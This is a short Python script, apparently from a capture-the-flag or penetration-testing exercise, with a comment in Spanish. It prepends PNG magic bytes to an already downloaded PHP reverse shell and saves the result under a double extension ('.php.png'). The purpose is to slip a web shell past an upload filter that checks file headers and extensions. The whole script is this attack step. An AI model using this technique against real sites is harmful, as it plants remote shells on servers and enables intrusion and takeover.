#!/usr/bin/env python3

magic = bytearray([
	0x89,
	0x50,
	0x4e,
	0x47,
	0x0d,
	0x0a,
	0x1a,
	0x0a
])

#este archivo ya lo habiamos descargado
with open("php-reverse-shell.php", "rb") as h:
	content = h.read()

with open("revshell02.php.png", "wb") as h:
	h.write(magic + content)
